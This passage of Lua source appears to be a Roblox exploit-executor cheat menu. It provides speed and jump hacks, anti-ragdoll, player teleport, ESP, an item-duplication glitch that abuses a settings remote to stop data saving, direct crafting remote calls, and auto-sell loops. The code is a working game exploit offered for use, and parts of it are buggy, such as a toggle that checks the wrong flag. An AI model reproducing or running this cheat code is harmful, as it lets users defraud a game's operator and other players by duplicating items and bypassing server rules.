                    if not LocalPlayer.Character:FindFirstChild('Shovel') then
                        RemoteEvents['InventoryInteraction']:FireServer(169, 'Equip')
                    end
                    task.wait(0.4)
                    RemoteEvents['ToolAction']:FireServer(CLUELOCATION)
                    return true
                end
            else
                return false
            end
        end
        if TrackClueImage() then
            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
        end
    end
})

local BumpUpChestSection = Chests:CreateSection('')

local PlayerModificationsSection = LPlayer:CreateSection('Player Modifications')

PlayerModificationsSection:CreateToggle({
    Name = 'Inf-Jump',
    Default = false,
    Flag = 'InfJump',
    Callback = function(Value)
        getgenv().configs.InfJump = Value
        InfJump()
	end
})

PlayerModificationsSection:CreateToggle({
    Name = 'Anti-Ragdoll',
    Default = false,
    Flag = 'AntiRagDoll',
    Callback = function(Value)
        getgenv().configs.AntiRagDoll = Value
        if getgenv().configs.AntiRagDoll then
            if not getgenv().RagDollBypass then
                getgenv().RagDollBypass = LocalPlayer.Character:WaitForChild('Humanoid').StateChanged:Connect(function(state)
                    if not getgenv().configs.AntiRagDoll then
                        getgenv().RagDollBypass:Disconnect()
                        getgenv().RagDollBypass = nil
                        return
                    end
                    if IsPlayerAlive(LocalPlayer) then
                        if LocalPlayer.Character:WaitForChild('Humanoid'):GetState() == Enum.HumanoidStateType.Physics then
                            LocalPlayer.Character.Humanoid:ChangeState(2)
                        end
                    end
                end)
            end
        else
            if getgenv().RagDollBypass then
                getgenv().RagDollBypass:Disconnect()
                getgenv().RagDollBypass = nil
            end
        end
	end
})

PlayerModificationsSection:CreateKeybind({
    Name = 'QuickSpeed',
    Default = "B",
    Flag = 'QuickSpeed',
    Callback = function(key)
        getgenv().QuickSpeedKey = key
    end,
    KeyPressed = function()
        while UserInputService:IsKeyDown(getgenv().QuickSpeedKey) and not UserInputService:GetFocusedTextBox() do
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection * (getgenv().QuickSpeedMultiplier*.50))
                end
            end
        end
    end
})

PlayerModificationsSection:CreateSlider({
    Name = 'QuickSpeed multiplier',
    Min = 1,
	Max = 20,
	Default = 1,
	Digits = 0,
    Flag = 'QuickSpeedMultiplier',
	Callback = function(Value)
		getgenv().QuickSpeedMultiplier = Value
	end     
})

PlayerModificationsSection:CreateSlider({
    Name = 'Swim Speed',
    Min = 10,
	Max = 100,
	Default = 14,
	Digits  = 0,
    Flag = 'SwimSpeed',
	Callback = function(Value)
		local Constants = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('CONSTANTS'))
		Constants.WALK_SPEEDS.SWIM = Value
	end 
})

PlayerModificationsSection:CreateToggle({
    Name = 'Jump Power',
    Default = false,
    Flag = 'JumpPower',
    Callback = function(Value)
       getgenv().configs.JumpPower = Value 
       JumpPower()
    end
})

PlayerModificationsSection:CreateToggle({
    Name = 'Sneaky Speed',
    Default = false,
    Flag = 'SneakySpeed',
    Callback = function(Value)
        getgenv().configs.ExtraSpeed = Value 
       ExtraSpeed()
    end
})

local MiscModSections = LPlayer:CreateSection('Misc Mods')

MiscModSections:CreateButton({
    Name = 'Drive in water',
    Callback = function()
        local Cart = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Vehicle'):WaitForChild('Cart'))
        Cart.TerrainCheck = function()
            return false 
        end
    end
})

MiscModSections:CreateTextBox({
    Name = 'Player Tp',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'PlayerTpTextbox',
    Callback = function(Value)
        if Value == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                    if IsPlayerAlive(LocalPlayer) and IsPlayerAlive(plr) then
                        local targetpos = plr.Character.HumanoidRootPart.Position
                        local myroot = LocalPlayer.Character.HumanoidRootPart.Position
                        myroot.CFrame = CFrame.new(targetpos)
                        MakeAtlasNotification('Success', 'Tped to: '..plr.Name, 3)
                    end
                end
            end
        end
    end
})

local RealDupeSection = Dupe:CreateSection('Real Duplication Glitch(data does not save)')

RealDupeSection:CreateButton({
    Name = 'Stop data(dupe)',
    Callback = function(Value)
        RemoteEvents['SetSettings']:FireServer(Workspace)
		MakeAtlasNotification('Data Stopped', 'Drop anything you want :)', 5)
    end
})

RealDupeSection:CreateButton({
    Name = 'Rejoin Current Server',
    Callback = function(Value)
		MakeAtlasNotification('Rejoining', 'Rejoining the server', 1)
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end
})

RealDupeSection:CreateTextBox({
    Name = 'Loop Item Drop Name:',
    DefaultText = '',
    PlaceholderText = 'Inventory Item',
    ClearTextOnFocus = true,
    Flag = 'RepeatDropInventoryItem',
    Callback = function(args)
        if args == "" then return end
        for _, item in pairs(MyInventory:GetChildren()) do
            if string.find(item.Name:lower(), args:lower()) then
                ItemIndexed = item
                return MakeAtlasNotification('Item Selected:', item.Name, 3)
            else
                ItemIndexed = nil
				ItemIndexedNumber = nil
            end
        end
        return MakeAtlasNotification('Invalid Item', 'Item not found', 3)
    end
})

RealDupeSection:CreateToggle({
    Name = 'Loop Item Drop',
    Default = false,
    Flag = 'LoopDropItem',
    Callback  = function(Value)
        getgenv().configs.AmountToLoopDrop = Value
        if getgenv().configs.AmountToLoopDrop == true then
            if ItemIndexed and ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel') then
                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
                repeat task.wait()
                    if IsPlayerAlive(LocalPlayer) then
                        if ItemIndexed.Parent then
                            if ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+') == nil then
                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
                            else
                                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
                            end
                        end
                    end
                until not ItemIndexed.Parent or not getgenv().configs.AmountToLoopDrop or not IsPlayerAlive(LocalPlayer)
            end
        end
    end
})

local RealDupeSection = Dupe:CreateSection('Craft Armor')

RealDupeSection:CreateButton({
    Name = 'Craft Full Soul        	(REQ.  |   40 Soul',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(201,202,203,204, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Craft Obsidian Armor        	(REQ.  |   40 Obsidian',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(225,226,227,228, GetClosestTrapPlayer(), 690)
    end
end
})

local RealDupeSection = Dupe:CreateSection('Craft Shields')

RealDupeSection:CreateButton({
    Name = 'Craft Pumpkin Shield        	(REQ.  |   15 Pumpkins',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(379, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Craft Soul Shield        	(REQ.  |   7 Souls,  3 Stone',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(218, GetClosestTrapPlayer(), 690)
    end
end
})


local RealDupeSection = Dupe:CreateSection('Spawn Sleigh')

RealDupeSection:CreateButton({
    Name = 'Spawn Sleigh        	(REQ.  |   5 Ruby, 100 Candy) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(183, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Grinchs Sleigh        	(REQ.  |   6 Coal, 5 Zen, 200 Candy) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(185, GetClosestTrapPlayer(), 690)
    end
end
})

local RealDupeSection = Dupe:CreateSection('Spawn Decoration')

RealDupeSection:CreateButton({
    Name = 'Spawn Pirate Ship        	(REQ.  |   1 Wood) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(221, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Potion Cauldron        	(REQ.  |   ???) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(371, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Harpoon Turret        	(REQ.  |   ???) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(234, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Harpoon Turret        	(REQ.  |   ???) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(234, GetClosestTrapPlayer(), 690)
    end
end
})

local AutoSellSection = AutoSell:CreateSection('AutoSell (This does not account for pet token multipliers)')

AutoSellSection:CreateToggle({
    Name = '4 Silver Bar = 1 Token',
    Default = false,
    Flag = 'SellSilverBar',
    Callback = function(Value)
        _G.SellSilver = Value
        while _G.SellSilver and task.wait(0.5) do
            if _G.SellSilver then
                SellItem('Silver Bar', 4, 14)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '4 Slime Ball = 1 Token',
    Default = false,
    Flag = 'SellSlimeBall',
    Callback = function(Value)
        _G.SellSlime = Value
        while _G.SellSlime and task.wait(0.5) do
            if _G.SellSlime then
                SellItem('Slime Ball', 40, 15)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '2 Gold Bar = 1 Token',
    Default = false,
    Flag = 'SellGoldBar',
    Callback = function(Value)
        _G.SellGold = Value
        while _G.SellSlime and task.wait(0.5) do
            if _G.SellSlime then
                SellItem("Gold Bar", 2, 16)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Ruby = 3 Token',
    Default = false,
    Flag = 'SellRuby',
    Callback = function(Value)
        _G.SellRuby = Value
        while _G.SellRuby and task.wait(0.5) do
            if _G.SellRuby then
                SellItem("Ruby", 1, 17)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Diamond = 4 Token',
    Default = false,
    Flag = 'SellDiamond',
    Callback = function(Value)
        _G.SellDiamonds = Value
        while _G.SellDiamonds and task.wait(0.5) do
            if _G.SellDiamonds then
                SellItem("Diamond", 1, 18)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Soul = 5 Token',
    Default = false,
    Flag = 'SellSoul',
    Callback = function(Value)
        _G.SellSouls = Value
        while _G.SellSouls and task.wait(0.5) do
            if _G.SellSouls then
                if getgenv().configs.UseSoulKeys then
                    SellItem("Soul", 11, 22)
                else
                    SellItem("Soul", 1, 22)
                end
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Zenyte = 6 Token',
    Default = false,
    Flag = 'SellZenyte',
    Callback = function(Value)
        _G.SellZenyte = Value
        while _G.SellZenyte and task.wait(0.5) do
            if _G.SellZenyte then
                SellItem("Zenyte", 1, 19)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Volcanic Ore = 15 Token',
    Default = false,
    Flag = 'SellVolcanicOre',
    Callback = function(Value)
        _G.SellVolcanicOre = Value
        while _G.SellVolcanicOre and task.wait(0.5) do
            if _G.SellVolcanicOre then
                SellItem("Volcanic Ore", 1, 23)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Obsidian = 20 Token',
    Default = false,
    Flag = 'SellObsidian',
    Callback = function(Value)
        _G.SellObsidian = Value
        while _G.SellObsidian and task.wait(0.5) do
            if _G.SellObsidian then
                SellItem("Obsidian", 1, 24)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Lunar Ore = 25 Token',
    Default = false,
    Flag = 'SellLunar',
    Callback = function(Value)
        _G.SellLunarOre = Value
        while _G.SellLunarOre and task.wait(0.5) do
            if _G.SellLunarOre then
                SellItem("Lunar Ore", 1, 25)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Moonstone = 30 Token',
    Default = false,
    Flag = 'SellMoonstone',
    Callback = function(Value)
        _G.SellMoonstone = Value
        while _G.SellMoonstone and task.wait(0.5) do
            if _G.SellMoonstone then
                SellItem("Moonstone", 1, 26)
            end
        end
    end
})

local ArmorTraderSection = AutoSell:CreateSection('Armor Trader')

ArmorTraderSection:CreateButton({
    Name = 'Ruby Shield = 50 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 27)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Shield = 100 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 28)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Shield = 150 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 29)
    end
})


ArmorTraderSection:CreateButton({
    Name = 'Obsidian Shield = 350 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 30)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Helmet = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 31)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Body = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 32)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Legs = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 33)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Boots = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 34)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Helmet = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 35)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Body = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 36)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Legs = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 37)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Boots = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 38)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Helmet = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 39)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Body = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 40)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Legs = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 41)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Boots = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 42)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Helmet = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 43)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Body = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 44)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Legs = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 45)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Boots = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 46)
    end
})


ArmorTraderSection:CreateButton({
    Name = 'Moostone Helmet = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 47)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Moostone Body = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 48)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Moostone Legs = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 49)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Moostone Boots = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 50)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Springy Boots',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 51)
    end
})

local WeaponTraderSection = AutoSell:CreateSection('Weapon Trader')

WeaponTraderSection:CreateButton({
    Name = 'Silver Sword = 1 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 11)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Gold Sword = 2 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 12)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Gold Bow = 3 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 13)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Ruby Sword = 10 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 14)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Diamond Sword = 18 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 15)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Zenyte Sword = 30 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 17)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Diamond Crossbow = 36 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 16)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Zenyte Crossbow = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 18)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Obsidian Club = 80 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 19)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Moonstone Sword = 130 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 20)
    end
})

local EspSection = Visuals:CreateSection('Esp')

EspSection:CreateToggle({
    Name = "Esp",
    Default = false,
    Flag = 'PlayerEsp',
    Callback = function(Value)
        getgenv().configs.PlayerEsp = Value
        PlayerEsp()
    end
})

local VisualsSection = Visuals:CreateSection('Visuals')

VisualsSection:CreateSliderToggle({
	Name = "Time Of Day",
	Min = 0.1,
	Max = 24,
    Digits = 1,
	SliderDefault = Lighting.ClockTime,
    ToggleDefault = false,
    SliderFlag = 'TimeOfDay',
    ToggleFlag = 'ToggleTimeOfDay',
    SliderCallback = function(Value)
        _G.ClockTime = Value
    end,
	ToggleCallback = function(Value)
        if _G.ClockTime then
            Lighting.ClockTime = _G.ClockTime
            _G.ClockTimeChanged = Value
            if not ClockTimeChanged and _G.ClockTimeChanged then
                ClockTimeChanged = Lighting.Changed:Connect(function(clock)
                    if not _G.ClockTimeChanged then
                        ClockTimeChanged:Disconnect()
                        ClockTimeChanged = nil
                    end
                    if clock == 'ClockTime' then
                        Lighting.ClockTime = _G.ClockTime
                    end
                end)
            else
                if ClockTimeChanged then
                    ClockTimeChanged:Disconnect()
                    ClockTimeChanged = nil
                end
            end
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Brightness",
	Min = 0.1,
	Max = 15,
    Digits = 1,
	SliderDefault = Lighting.Brightness,
    ToggleDefault = false,
    SliderFlag = 'Brightness',
    ToggleFlag = 'ToggleBrightness',
    SliderCallback = function(Value)
        _G.Brightness = Value
    end,
	ToggleCallback = function(Value)
        if _G.Brightness then
            Lighting.Brightness = _G.Brightness
            _G.BrightnessChanged = Value
            if not BrightnessChanged and _G.BrightnessChanged then
                BrightnessChanged = Lighting.Changed:Connect(function(clock)
                    if not _G.BrightnessChanged then
                        BrightnessChanged:Disconnect()
                        BrightnessChanged = nil
                    end
                    if clock == 'Brightness' then
                        Lighting.Brightness = _G.Brightness
                    end
                end)
            else
                if BrightnessChanged then
                    BrightnessChanged:Disconnect()
                    BrightnessChanged = nil
                end
            end
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Saturation",
	Min = 0.1,
	Max = 3,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('ColorCorrection').Saturation,
    ToggleDefault = false,
    SliderFlag = 'Saturation',
    ToggleFlag = 'ToggleSaturation',
    SliderCallback = function(Value)
        _G.Saturation = Value
    end,
	ToggleCallback = function(Value)
        if _G.Saturation then
            Lighting:WaitForChild('ColorCorrection').Saturation = _G.Saturation
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Contrast",
	Min = 0.1,
	Max = 3,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('ColorCorrection').Contrast,
    ToggleDefault = false,
    SliderFlag = 'Contrast',
    ToggleFlag = 'ToggleContrast',
    SliderCallback = function(Value)
        _G.Contrast = Value
    end,
	ToggleCallback = function(Value)
        if _G.Contrast then
            Lighting:WaitForChild('ColorCorrection').Contrast = _G.Contrast
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Fog End",
	Min = 0.1,
	Max = 15,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('Atmosphere').Density,
    ToggleDefault = false,
    SliderFlag = 'FogEnd',
    ToggleFlag = 'ToggleFogEnd',
    SliderCallback = function(Value)
        _G.FogEnd = Value
    end,
	ToggleCallback = function(Value)
        if _G.FogEnd then
            Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
            _G.FogEndChanged = Value
            if not FogEndChanged and _G.FogEndChanged then
                FogEndChanged = Lighting.Changed:Connect(function(clock)
                    if not _G.FogEndChanged then
                        FogEndChanged:Disconnect()
                        FogEndChanged = nil
                    end
                    if clock == 'Fog End' then
                        Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
                    end
                end)
            else
                if FogEndChanged then
